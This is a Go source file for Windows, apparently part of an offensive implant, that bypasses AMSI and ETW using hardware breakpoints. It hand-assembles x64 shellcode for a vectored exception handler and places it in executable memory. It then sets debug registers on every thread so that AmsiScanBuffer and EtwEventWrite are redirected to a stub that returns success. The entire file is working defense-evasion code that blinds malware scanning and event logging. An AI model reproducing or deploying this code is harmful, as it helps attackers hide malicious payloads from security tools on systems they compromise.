//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"runtime"
	"sync"
	"syscall"
	"unsafe"
)

// Hardware breakpoint Windows API procs (kernel32 is declared in vanillainjection.go)
var (
	procAddVectoredExceptionHandler = kernel32.NewProc("AddVectoredExceptionHandler")
	procGetCurrentProcessId         = kernel32.NewProc("GetCurrentProcessId")
	procGetCurrentThreadId          = kernel32.NewProc("GetCurrentThreadId")
	procSuspendThread               = kernel32.NewProc("SuspendThread")
	procSetThreadContext            = kernel32.NewProc("SetThreadContext")
	procGetThreadContext            = kernel32.NewProc("GetThreadContext")
	procVirtualAlloc                = kernel32.NewProc("VirtualAlloc")
)

// Hardware breakpoint constants
const (
	CONTEXT_AMD64_FLAG      = 0x00100000
	CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64_FLAG | 0x0010
	CONTEXT_ALL_FLAGS       = CONTEXT_AMD64_FLAG | 0x001F

	STATUS_SINGLE_STEP           = 0x80000004
	EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF // -1 as uint32
	EXCEPTION_CONTINUE_SEARCH    = 0x0

	INFINITE = 0xFFFFFFFF

	// PAGE_EXECUTE_READWRITE is declared in poolpartyinjection.go
)

// M128A represents a 128-bit value for the CONTEXT FPU/vector area
type M128A struct {
	Low  uint64
	High uint64
}

// CONTEXT_AMD64 is the x64 CONTEXT structure (1232 bytes) used by
// GetThreadContext/SetThreadContext. Fields are laid out to match the
// Windows SDK definition exactly.
type CONTEXT_AMD64 struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
	FltSave      [512]byte
	VectorReg    [26]M128A
	VectorCtl    uint64
	DebugCtl     uint64
	LBrTo        uint64
	LBrFrom      uint64
	LExTo        uint64
	LExFrom      uint64
}

// EXCEPTION_RECORD is the Windows EXCEPTION_RECORD structure for x64
type EXCEPTION_RECORD struct {
	ExceptionCode    uint32
	ExceptionFlags   uint32
	ExceptionRecord  *EXCEPTION_RECORD
	ExceptionAddress uintptr
	NumberParameters uint32
	_                [4]byte // padding for x64 alignment
	ExceptionInfo    [15]uintptr
}

// EXCEPTION_POINTERS is passed to the VEH callback
type EXCEPTION_POINTERS struct {
	ExceptionRecord *EXCEPTION_RECORD
	ContextRecord   *CONTEXT_AMD64
}

// Global state for hardware breakpoint VEH handler
var (
	hwbpMutex      sync.Mutex
	hwbpInstalled  bool
	hwbpDataBlock  uintptr // Pointer to data block containing target addresses
	hwbpHandlerMem uintptr // Pointer to executable shellcode handler
)

// buildNativeVEHHandler creates a native x64 machine code VEH handler that
// does NOT depend on the Go runtime, so it can safely execute on non-Go threads
// (e.g., CLR-created threads). This fixes the crash caused by syscall.NewCallback.
//
// The handler is allocated via VirtualAlloc with PAGE_EXECUTE_READWRITE.
// A separate data block (RW) stores the AMSI and ETW target addresses.
//
// Data block layout (24 bytes):
//
//	[0x00] uint64: AmsiScanBuffer address (0 = not set)
//	[0x08] uint64: EtwEventWrite address  (0 = not set)
//	[0x10] uint64: Gadget address ("xor eax,eax; ret" for AMSI bypass)
//
// Handler logic (x64 Windows ABI, RCX = EXCEPTION_POINTERS*):
//  1. Check ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
//  2. Load ContextRecord pointer
//  3. Compare ContextRecord->Rip against AMSI addr → redirect Rip to embedded
//     "xor eax,eax; ret" gadget (returns S_OK to caller via native RET)
//  4. Compare ContextRecord->Rip against ETW addr → same gadget redirect
//     (returns 0/STATUS_SUCCESS via native RET)
//  5. Clear Dr6
//  6. Return EXCEPTION_CONTINUE_EXECUTION (-1)
//  7. If no match → return EXCEPTION_CONTINUE_SEARCH (0)
func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, dataAddr uintptr, err error) {
	// Allocate 24-byte data block (RW) for target addresses and gadget pointer
	dataPtr, _, callErr := procVirtualAlloc.Call(
		0,
		24,
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if dataPtr == 0 {
		return 0, 0, fmt.Errorf("VirtualAlloc for data block failed: %v", callErr)
	}

	// Write target addresses into data block
	// [0x00] = AmsiScanBuffer addr, [0x08] = EtwEventWrite addr, [0x10] = gadget addr (filled later)
	dataSlice := (*[24]byte)(unsafe.Pointer(dataPtr))
	binary.LittleEndian.PutUint64(dataSlice[0:8], uint64(amsiAddr))
	binary.LittleEndian.PutUint64(dataSlice[8:16], uint64(etwAddr))

	// Build x64 shellcode for VEH handler.
	// Windows x64 ABI: first arg (EXCEPTION_POINTERS*) is in RCX.
	//
	// EXCEPTION_POINTERS layout:
	//   [+0x00] EXCEPTION_RECORD* ExceptionRecord
	//   [+0x08] CONTEXT*          ContextRecord
	//
	// EXCEPTION_RECORD layout:
	//   [+0x00] DWORD ExceptionCode
	//
	// CONTEXT_AMD64 offsets:
	//   Dr6  = 0x68
	//   Rax  = 0x78
	//   Rsp  = 0x98
	//   Rip  = 0xF8
	//
	var code []byte

	// Function prologue — save non-volatile registers we use
	code = append(code, 0x55)                         // push rbp
	code = append(code, 0x48, 0x89, 0xE5)             // mov rbp, rsp
	code = append(code, 0x53)                         // push rbx
	code = append(code, 0x41, 0x54)                   // push r12
	code = append(code, 0x41, 0x55)                   // push r13

	// Load ExceptionRecord pointer: rax = [rcx+0x00]
	code = append(code, 0x48, 0x8B, 0x01)             // mov rax, [rcx]

	// Check ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
	// cmp dword [rax], 0x80000004
	code = append(code, 0x81, 0x38, 0x04, 0x00, 0x00, 0x80) // cmp dword [rax], 0x80000004

	// jne not_ours
	code = append(code, 0x0F, 0x85) // jne rel32 (patched below)
	jneNotOursOffset := len(code)
	code = append(code, 0x00, 0x00, 0x00, 0x00) // placeholder

	// Load ContextRecord pointer: rbx = [rcx+0x08]
	code = append(code, 0x48, 0x8B, 0x59, 0x08)       // mov rbx, [rcx+0x08]

	// Load Rip from context: r12 = [rbx+0xF8]
	code = append(code, 0x4C, 0x8B, 0xA3)             // mov r12, [rbx+0xF8]
	code = append(code, 0xF8, 0x00, 0x00, 0x00)

	// Load data block address into r13
	// movabs r13, <dataPtr>
	code = append(code, 0x49, 0xBD)                    // movabs r13, imm64
	dataPtrBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(dataPtrBytes, uint64(dataPtr))
	code = append(code, dataPtrBytes...)

	// --- Check AMSI address ---
	// Load amsiAddr from data block: rax = [r13+0x00]
	code = append(code, 0x49, 0x8B, 0x45, 0x00)       // mov rax, [r13+0x00]
	// test rax, rax (skip if 0)
	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
	code = append(code, 0x74) // jz skip_amsi (rel8)
	jzSkipAmsiOffset := len(code)
	code = append(code, 0x00) // placeholder

	// cmp r12, rax (compare Rip with amsiAddr)
	code = append(code, 0x4C, 0x39, 0xE0)             // cmp rax, r12
	code = append(code, 0x75) // jne skip_amsi (rel8)
	jneSkipAmsiOffset := len(code)
	code = append(code, 0x00) // placeholder

	// AMSI match: redirect execution to an embedded "xor eax,eax; ret" gadget.
	// The gadget executes naturally via the CPU's RET instruction, returning
	// S_OK (0) to AmsiScanBuffer's caller with correct stack unwinding.
	// Load gadget address from data block: rax = [r13+0x10]
	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
	// Set context.Rip to gadget address: [rbx+0xF8] = rax
	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
	// Disable Dr0 (AMSI breakpoint) by clearing bit 0 of Dr7 in context
	// so the breakpoint doesn't fire on subsequent calls from this thread.
	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x70]
	code = append(code, 0x70, 0x00, 0x00, 0x00)       // Dr7 offset
	code = append(code, 0x48, 0x83, 0xE0, 0xFE)       // and rax, ~1 (clear bit 0)
	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x70], rax
	code = append(code, 0x70, 0x00, 0x00, 0x00)
	// Clear Dr6: [rbx+0x68] = 0
	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x68], 0
	code = append(code, 0x68, 0x00, 0x00, 0x00)
	code = append(code, 0x00, 0x00, 0x00, 0x00)
	// Return EXCEPTION_CONTINUE_EXECUTION
	code = append(code, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF) // mov eax, -1
	code = append(code, 0x41, 0x5D)                   // pop r13
	code = append(code, 0x41, 0x5C)                   // pop r12
	code = append(code, 0x5B)                         // pop rbx
	code = append(code, 0x5D)                         // pop rbp
	code = append(code, 0xC3)                         // ret

	// skip_amsi:
	skipAmsiTarget := len(code)
	code[jzSkipAmsiOffset] = byte(skipAmsiTarget - jzSkipAmsiOffset - 1)
	code[jneSkipAmsiOffset] = byte(skipAmsiTarget - jneSkipAmsiOffset - 1)

	// --- Check ETW address ---
	// Load etwAddr from data block: rax = [r13+0x08]
	code = append(code, 0x49, 0x8B, 0x45, 0x08)       // mov rax, [r13+0x08]
	// test rax, rax
	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
	code = append(code, 0x74) // jz not_ours_short (rel8)
	jzNotOursShortOffset := len(code)
	code = append(code, 0x00) // placeholder

	// cmp r12, rax
	code = append(code, 0x4C, 0x39, 0xE0)             // cmp rax, r12
	code = append(code, 0x75) // jne not_ours_short (rel8)
	jneNotOursShortOffset := len(code)
	code = append(code, 0x00) // placeholder

	// ETW match: redirect execution to the same "xor eax,eax; ret" gadget.
	// EtwEventWrite returns ULONG (0 = success).
	// Load gadget address from data block: rax = [r13+0x10]
	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
	// Set context.Rip to gadget address: [rbx+0xF8] = rax
	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
	// Disable Dr1 (ETW breakpoint) by clearing bit 2 of Dr7 in context
	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x70]
	code = append(code, 0x70, 0x00, 0x00, 0x00)       // Dr7 offset
	code = append(code, 0x48, 0x83, 0xE0, 0xFB)       // and rax, ~4 (clear bit 2)
	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x70], rax
	code = append(code, 0x70, 0x00, 0x00, 0x00)
	// Clear Dr6: [rbx+0x68] = 0
	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x68], 0
	code = append(code, 0x68, 0x00, 0x00, 0x00)
	code = append(code, 0x00, 0x00, 0x00, 0x00)
	// Return EXCEPTION_CONTINUE_EXECUTION
	code = append(code, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF) // mov eax, -1
	code = append(code, 0x41, 0x5D)                   // pop r13
	code = append(code, 0x41, 0x5C)                   // pop r12
	code = append(code, 0x5B)                         // pop rbx
	code = append(code, 0x5D)                         // pop rbp
	code = append(code, 0xC3)                         // ret

	// not_ours_short: (jump target for ETW misses → fall through to not_ours)
	notOursShortTarget := len(code)
	code[jzNotOursShortOffset] = byte(notOursShortTarget - jzNotOursShortOffset - 1)
	code[jneNotOursShortOffset] = byte(notOursShortTarget - jneNotOursShortOffset - 1)

	// not_ours:
	notOursTarget := len(code)
	// Patch the jne rel32 from the ExceptionCode check
	rel32 := int32(notOursTarget - (jneNotOursOffset + 4))
	binary.LittleEndian.PutUint32(code[jneNotOursOffset:jneNotOursOffset+4], uint32(rel32))

	// Return EXCEPTION_CONTINUE_SEARCH (0)
	code = append(code, 0x31, 0xC0)                   // xor eax, eax

	// Epilogue
	code = append(code, 0x41, 0x5D)                   // pop r13
	code = append(code, 0x41, 0x5C)                   // pop r12
	code = append(code, 0x5B)                         // pop rbx
	code = append(code, 0x5D)                         // pop rbp
	code = append(code, 0xC3)                         // ret

	// Append the "xor eax, eax; ret" gadget for AMSI bypass.
	// When the AMSI breakpoint fires, the VEH handler redirects Rip here.
	// This gadget executes as if AmsiScanBuffer returned S_OK (0).
	gadgetOffset := len(code)
	code = append(code, 0x31, 0xC0)                   // xor eax, eax
	code = append(code, 0xC3)                         // ret

	// Allocate executable memory and copy shellcode + gadget
	codeSize := uintptr(len(code))
	codePtr, _, callErr := procVirtualAlloc.Call(
		0,
		codeSize,
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if codePtr == 0 {
		return 0, 0, fmt.Errorf("VirtualAlloc for handler shellcode failed: %v", callErr)
	}

	// Copy shellcode to executable memory
	codeSlice := unsafe.Slice((*byte)(unsafe.Pointer(codePtr)), len(code))
	copy(codeSlice, code)

	// Store gadget address in data block at offset 0x10
	gadgetAddr := codePtr + uintptr(gadgetOffset)
	binary.LittleEndian.PutUint64(dataSlice[16:24], uint64(gadgetAddr))

	return codePtr, dataPtr, nil
}

// resolveFunctionAddress loads a DLL and returns the address of the specified function.
func resolveFunctionAddress(dllName, funcName string) (uintptr, error) {
	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		return 0, fmt.Errorf("failed to load %s: %v", dllName, err)
	}
	proc, err := dll.FindProc(funcName)
	if err != nil {
		return 0, fmt.Errorf("failed to find %s in %s: %v", funcName, dllName, err)
	}
	return proc.Addr(), nil
}

// setThreadDebugRegisters suspends the thread, sets Dr0/Dr1/Dr7 via
// GetThreadContext/SetThreadContext, then resumes it.
func setThreadDebugRegisters(hThread uintptr, dr0, dr1, dr7 uint64) error {
	// Suspend the thread
	ret, _, err := procSuspendThread.Call(hThread)
	if int32(ret) == -1 {
		return fmt.Errorf("SuspendThread failed: %v", err)
	}

	// Get thread context (only debug registers)
	var ctx CONTEXT_AMD64
	ctx.ContextFlags = CONTEXT_ALL_FLAGS

	ret, _, err = procGetThreadContext.Call(
		hThread,
		uintptr(unsafe.Pointer(&ctx)),
	)
	if ret == 0 {
		// Resume even if get failed
		procResumeThread.Call(hThread)
		return fmt.Errorf("GetThreadContext failed: %v", err)
	}

	// Set debug registers
	if dr0 != 0 {
		ctx.Dr0 = dr0
	}
	if dr1 != 0 {
		ctx.Dr1 = dr1
	}
	ctx.Dr7 = dr7
	ctx.Dr6 = 0 // Clear debug status
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS

	ret, _, err = procSetThreadContext.Call(
		hThread,
		uintptr(unsafe.Pointer(&ctx)),
	)
	if ret == 0 {
		procResumeThread.Call(hThread)
		return fmt.Errorf("SetThreadContext failed: %v", err)
	}

	// Resume the thread
	procResumeThread.Call(hThread)
	return nil
}

// SetupHardwareBreakpoints registers a native VEH (pure x64 machine code, no Go
// runtime dependency) and sets hardware breakpoints on the specified function
// addresses across all threads in the current process.
// amsiAddr is set in Dr0, etwAddr is set in Dr1.
func SetupHardwareBreakpoints(amsiAddr, etwAddr uintptr) (string, error) {
	hwbpMutex.Lock()
	defer hwbpMutex.Unlock()

	// Pin the calling goroutine to its OS thread so GetCurrentThreadId is stable
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var output string

	// Register VEH if not already done
	if !hwbpInstalled {
		handlerAddr, dataAddr, err := buildNativeVEHHandler(amsiAddr, etwAddr)
		if err != nil {
			return "", fmt.Errorf("failed to build native VEH handler: %v", err)
		}
		hwbpHandlerMem = handlerAddr
		hwbpDataBlock = dataAddr

		handle, _, vehErr := procAddVectoredExceptionHandler.Call(1, handlerAddr)
		if handle == 0 {
			return "", fmt.Errorf("AddVectoredExceptionHandler failed: %v", vehErr)
		}
		hwbpInstalled = true
		output += "[+] Native VEH handler registered (Go-runtime-independent)\n"
	} else {
		// Update target addresses in existing data block (gadget addr at 0x10 unchanged)
		dataSlice := (*[24]byte)(unsafe.Pointer(hwbpDataBlock))
		binary.LittleEndian.PutUint64(dataSlice[0:8], uint64(amsiAddr))
		binary.LittleEndian.PutUint64(dataSlice[8:16], uint64(etwAddr))
		output += "[*] VEH already registered, updating breakpoint addresses\n"
	}

	// Build Dr7 value
	var dr7 uint64
	if amsiAddr != 0 {
		dr7 |= 1 // Local enable Dr0 (bit 0) - execution breakpoint
		// Condition bits 16-17 = 00 (execution), Length bits 18-19 = 00 (1 byte) -- already 0
	}
	if etwAddr != 0 {
		dr7 |= (1 << 2) // Local enable Dr1 (bit 2) - execution breakpoint
		// Condition bits 20-21 = 00 (execution), Length bits 22-23 = 00 (1 byte) -- already 0
	}

	// Get current PID and TID
	currentPID, _, _ := procGetCurrentProcessId.Call()
	currentTID, _, _ := procGetCurrentThreadId.Call()
	output += fmt.Sprintf("[*] Current PID: %d, TID: %d\n", currentPID, currentTID)

	// Enumerate all threads in the process via CreateToolhelp32Snapshot
	// (procCreateToolhelp32Snapshot, procThread32First, procThread32Next, THREADENTRY32
	//  and TH32CS_SNAPTHREAD are declared in ts.go in the same package)
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPTHREAD), 0)
	if snapshot == uintptr(^uintptr(0)) { // INVALID_HANDLE_VALUE
		return output, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer procCloseHandle.Call(snapshot)

	var entry THREADENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	patchedCount := 0

	ret, _, err := procThread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return output, fmt.Errorf("Thread32First failed: %v", err)
	}

	for {
		if uintptr(entry.OwnerProcessID) == currentPID && uintptr(entry.ThreadID) != currentTID {
			// Open handle to this thread
			hThread, _, _ := procOpenThread.Call(
				uintptr(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME),
				0,
				uintptr(entry.ThreadID),
			)
			if hThread != 0 {
				if err := setThreadDebugRegisters(hThread, uint64(amsiAddr), uint64(etwAddr), dr7); err != nil {
					output += fmt.Sprintf("[-] Failed to patch TID %d: %v\n", entry.ThreadID, err)
				} else {
					patchedCount++
				}
				procCloseHandle.Call(hThread)
			}
		}

		// Reset entry size for next iteration
		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procThread32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	output += fmt.Sprintf("[+] Patched %d threads with debug registers\n", patchedCount)

	// Patch the current thread using a helper goroutine on a separate OS thread
	hCurrentThread, _, _ := procOpenThread.Call(
		uintptr(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME),
		0,
		currentTID,
	)
	if hCurrentThread == 0 {
		output += "[-] Warning: Could not open handle to current thread for HWBP\n"
	} else {
		done := make(chan error, 1)
		go func() {
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()
			done <- setThreadDebugRegisters(hCurrentThread, uint64(amsiAddr), uint64(etwAddr), dr7)
		}()
		if err := <-done; err != nil {
			output += fmt.Sprintf("[-] Failed to patch current thread: %v\n", err)
		} else {
			output += "[+] Patched current thread with debug registers\n"
		}
		procCloseHandle.Call(hCurrentThread)
	}

	output += "[+] Hardware breakpoint setup complete\n"
	return output, nil
}
